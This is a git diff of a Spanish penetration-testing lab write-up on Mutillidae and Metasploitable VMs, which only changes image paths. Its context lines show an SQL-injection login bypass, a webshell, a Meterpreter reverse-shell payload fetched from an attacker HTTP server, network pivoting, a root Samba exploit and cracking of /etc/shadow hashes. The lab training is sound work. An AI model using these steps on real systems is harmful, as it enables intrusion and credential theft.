@@ -208,8 +208,8 @@ skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/ind
 firefox ~/Desktop/skipfish_resultados/index.html
 ```
 
-![Skipfish resultados](img/skipfish-resultados1.jpg)
-![Skipfish vulnerabilidades](img/skipfish-resultados2.jpg)
+![Skipfish resultados](../img/skipfish-resultados1.jpg)
+![Skipfish vulnerabilidades](../img/skipfish-resultados2.jpg)
 ---
 
 ## 3. Fase 2: Explotación Web
@@ -242,7 +242,7 @@ username=usuario123&password=pass123&login-php-submit-button=Login
 ```
 
 
-![Burpsuite - Petición Login capturada](img/peticion-login-capturado-burp.jpg)
+![Burpsuite - Petición Login capturada](../img/peticion-login-capturado-burp.jpg)
 
 ---
 
@@ -271,7 +271,7 @@ username=admin' OR '1'='1&password=cualquiercosa&login-php-submit-button=Login
 ```
 
 
-![Iniciamos sesión como admin](img/burp-login-admin.jpg)
+![Iniciamos sesión como admin](../img/burp-login-admin.jpg)
 ---
 
 #### Paso 3: Fuerza Bruta con Burp Intruder
@@ -333,7 +333,7 @@ Request | Payload 1   | Payload 2    | Status | Length
 - Length: **Diferente** al resto (459 vs 59645)
 
 
-![Ataque Burpsuite exitoso](img/ataque-burp-exito.jpg)
+![Ataque Burpsuite exitoso](../img/ataque-burp-exito.jpg)
 ---
 
 ### 3.2 SQL Injection - Extracción de Datos
@@ -369,7 +369,7 @@ adrian      somepassword
 ```
 
 
-![Obtención de los datos de las cuentas](img/sql-obtencion-cuentas.jpg)
+![Obtención de los datos de las cuentas](../img/sql-obtencion-cuentas.jpg)
 ---
 
 #### 3.2.2 Bypass de Autenticación
@@ -423,7 +423,7 @@ OWASP 2017 → A1 - Injection (SQL) → SQLi - Bypass Authentication → Login
 ```
 mutillidae
 ```
-![Obtención del nombre de la base de datos](img/nombre-base-datos.jpg)
+![Obtención del nombre de la base de datos](../img/nombre-base-datos.jpg)
 ---
 
 #### 3.2.5 Obtener versión de MySQL
@@ -437,7 +437,7 @@ mutillidae
 ```
 5.7.33-0ubuntu0.20.04.1
 ```
-![Obtención del nombre de la base de datos](img/version-bd.jpg)
+![Obtención del nombre de la base de datos](../img/version-bd.jpg)
 ---
 
 #### 3.2.6 Listar todas las tablas
@@ -456,7 +456,7 @@ CHECK_CONTRAINTS
 ...
 ```
 
-![Lista de todas las tablas](img/listar-bd.jpg)
+![Lista de todas las tablas](../img/listar-bd.jpg)
 ---
 
 #### 3.2.7 Acceder a ficheros de manera remota
@@ -472,7 +472,7 @@ CHECK_CONTRAINTS
 username=esto es una prueba
 ```
 
-![Acceso a fichero de manea remota](img/acceder-fichero.remoto.jpg)
+![Acceso a fichero de manea remota](../img/acceder-fichero.remoto.jpg)
 
 
 ---
@@ -498,7 +498,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ... [contenido completo de /etc/passwd]
 ```
 
-![Lextura archivo](img/path-traversal2.jpg)
+![Lextura archivo](../img/path-traversal2.jpg)
 ---
 
 ### 3.4 Remote Code Execution - Webshell Upload
@@ -512,7 +512,7 @@ sudo chmod 777 /var/www/html/mutillidae/
 ls -ld /var/www/html/mutillidae/
 # Resultado: drwxrwxrwx
 ```
-![Verificación de permisos](img/verificar-permisos.jpg)
+![Verificación de permisos](../img/verificar-permisos.jpg)
 
 #### Paso 2: Crear código de webshell
 
@@ -559,7 +559,7 @@ ls -la /var/www/html/mutillidae/ | grep backdoor
 -rw-rw-rw- 1 mysql mysql 512 ene 10 14:23 backdoor.php
 ```
 
-![Verificación de creación de la webshell](img/verificar-webshell-2026.jpg)
+![Verificación de creación de la webshell](../img/verificar-webshell-2026.jpg)
 
 **✅ Webshell creada exitosamente**
 
@@ -583,7 +583,7 @@ http://192.168.0.21/mutillidae/index.php?page=backdoor.php
 └─────────────────────────────────┘
 ```
 
-![Interfaz de la webshell](img/interfaz-webshell.jpg)
+![Interfaz de la webshell](../img/interfaz-webshell.jpg)
 ---
 
 #### Paso 6: Ejecutar comandos
@@ -593,7 +593,7 @@ http://192.168.0.21/mutillidae/index.php?page=backdoor.php
 Command: whoami
 Resultado: www-data
 ```
-![Verificar usuario](img/verficar-usuario.jpg)
+![Verificar usuario](../img/verficar-usuario.jpg)
 
 **Comando 2: Listar archivos**
 ```
@@ -606,7 +606,7 @@ drwxr-xr-x  3 root     root      4096 sep 29  2023 ..
 ... [más archivos]
 ```
 
-![Listar archivos](img/listar-archivo.jpg)
+![Listar archivos](../img/listar-archivo.jpg)
 
 
 **Comando 3: Leer /etc/passwd**
@@ -615,7 +615,7 @@ Command: cat /etc/passwd
 Resultado: [contenido completo del archivo]
 ```
 
-![Lectura archivo /etc/pswswd](img/leer-etc.jpg)
+![Lectura archivo /etc/pswswd](../img/leer-etc.jpg)
 
 ---
 
@@ -644,7 +644,7 @@ Command: ip addr show
 - **ens33:** 192.168.0.21 → Red externa (conocida)
 - **ens37:** 192.168.8.131 → **RED INTERNA descubierta!**
 
-![Descubrimiento de la red interna](img/descubrir-red-interna.jpg)
+![Descubrimiento de la red interna](../img/descubrir-red-interna.jpg)
 
 ---
 
@@ -684,14 +684,14 @@ Payload size: 123 bytes
 Final size of elf file: 207 bytes
 ```
 
-![Payload en Meterpreter](img/payload-meterpreter.jpg)
+![Payload en Meterpreter](../img/payload-meterpreter.jpg)
 
 **Verificar creación:**
 ```bash
 ls -lh shell.elf
 # -rw-r--r-- 1 kali kali 207 ene 9 13:15 shell.elf
 ```
-![Verificación de la creación del payload](img/verificar-payload.jpg)
+![Verificación de la creación del payload](../img/verificar-payload.jpg)
 ---
 
 ### 5.2 Transferir Payload a Ubuntu
@@ -704,7 +704,7 @@ python3 -m http.server 8000
 # Resultado:
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-![Levantamos servidor Python](img/servidor-python.jpg)
+![Levantamos servidor Python](../img/servidor-python.jpg)
 
 #### Paso 2: Descargar desde webshell
 
@@ -725,7 +725,7 @@ chmod +x /tmp/shell.elf
 Command: ls -la /tmp/shell.elf
 Resultado: -rwxr-xr-x 1 www-data www-data 207 ene 9 13:20 /tmp/shell.elf
 ```
-![Verificamos su subida](img/verificar-subida.jpg)
+![Verificamos su subida](../img/verificar-subida.jpg)
 
 **✅ Payload listo para ejecutar**
 
@@ -750,7 +750,7 @@ exploit
 ```
 [*] Started reverse TCP handler on 192.168.0.30:4444
 ```
-![Handler](img/handler.jpg)
+![Handler](../img/handler.jpg)
 
 **⏳ Esperando conexión...**
 
@@ -774,7 +774,7 @@ meterpreter >
 **✅ Sesión Meterpreter establecida!**
 
 
-![Obtenemos sesión de Meterpreter](img/kali-sesion-abierta.jpg)
+![Obtenemos sesión de Meterpreter](../img/kali-sesion-abierta.jpg)
 ---
 
 ### 5.5 Verificar Sesión Meterpreter
@@ -790,7 +790,7 @@ Architecture : x64
 BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 ```
-![Verificar Sysinfo](img/verifica-sysinfo.jpg)
+![Verificar Sysinfo](../img/verifica-sysinfo.jpg)
 
 ```
 meterpreter > ifconfig
@@ -814,7 +814,7 @@ Name         : ens37
 IPv4 Address : 192.168.8.131  ← Red interna
 ```
 
-![Interfaces](img/donde-metasploitable.jpg)
+![Interfaces](../img/donde-metasploitable.jpg)
 ---
 
 ### 5.6 Configurar Autoroute (Pivoting)
@@ -831,7 +831,7 @@ meterpreter > run autoroute -s 192.168.8.0/24
 [*] Use the -p option to list all active routes
 ```
 
-![Creamos ruta](img/se-anade-ruta.jpg)
+![Creamos ruta](../img/se-anade-ruta.jpg)
 
 **Verificar rutas:**
 ```
@@ -847,11 +847,11 @@ Active Routing Table
    ------             -------            -------
    192.168.8.0        255.255.255.0      Session 1
 ```
-![Verificamos ruta](img/verificar-ruta.jpg)
+![Verificamos ruta](../img/verificar-ruta.jpg)
 
 **✅ Túnel de pivoting configurado correctamente**
 
-![Configuración de autoroute](img/add-route.jpg)
+![Configuración de autoroute](../img/add-route.jpg)
 
 Introducimos los siguientes comandos para averiguar la IP de Metasploitable
 
@@ -867,7 +867,7 @@ Resultado:
 192.168.8.1 y 192.168.8.254 → Gateways de la red host-only
 
 
-![Encontrar IP Metasploitable](img/encontrar-ip-meta.jpg)
+![Encontrar IP Metasploitable](../img/encontrar-ip-meta.jpg)
 ---
 
 ### 5.7 Escanear Red Interna a través del Pivoting
@@ -894,7 +894,7 @@ run
 [*] Auxiliary module execution completed
 ```
 
-![Escaneo de redes](img/portscan.jpg)
+![Escaneo de redes](../img/portscan.jpg)
 
 Parece que los puertos típicos (21, 22, 23, 80, 139, 445) están filtrados o cerrados. Vamos a hacer un escaneo más amplio y luego explotar algún servicio.
 
@@ -932,7 +932,7 @@ run
 8180/tcp open  unknown
 ```
 
-![Escaneo de puertos via pivoting](img/portscan.jpg)
+![Escaneo de puertos via pivoting](../img/portscan.jpg)
 ---
 
 ## 6. Fase 5: Explotación Red Interna
@@ -952,7 +952,7 @@ Ya tenemos acceso a Metasploitable a través del pivoting
 via session 1 → Está usando mi sesión Meterpreter en Ubuntu como puente
 192.168.8.131 (Ubuntu) → 192.168.8.133 (Metasploitable)
 
-![Exploit Samba](img/samba1.jpg)
+![Exploit Samba](../img/samba1.jpg)
 
 
 
@@ -981,7 +981,7 @@ uid=0(root) gid=0(root)
 **✅ Acceso ROOT obtenido!**
 
 
-![Acceso root obtenido](img/acceso-root.jpg)
+![Acceso root obtenido](../img/acceso-root.jpg)
 
 ---
 
@@ -1013,7 +1013,7 @@ eth0      Link encap:Ethernet  HWaddr 00:0c:29:80:d3:95
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
 ```
 
-![Enumeración](img/comandos-varios.jpg)
+![Enumeración](../img/comandos-varios.jpg)
 
 ---
 
@@ -1054,7 +1054,7 @@ user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
 service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
 ```
 
-![Extracción del archivo shadow](img/cat-etc.jpg)
+![Extracción del archivo shadow](../img/cat-etc.jpg)
 
 ### 7.2 Identificar Tipo de Hash
 
@@ -1073,7 +1073,7 @@ Analyzing '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
 Conclusión: Hashes MD5 Crypt ($1$)
 
 
-![Averiguar tipo de hash](img/tipo-hash.jpg)
+![Averiguar tipo de hash](../img/tipo-hash.jpg)
 
 ### 7.3 Cracking con John the Ripper
 
@@ -1092,7 +1092,7 @@ service:service
 3 password hashes cracked, 4 left
 ```
 
-![Resultados de John the Ripper](img/john-ripper.jpg)
+![Resultados de John the Ripper](../img/john-ripper.jpg)
 
 ### 7.4 Resumen de Credenciales Crackeadas
 
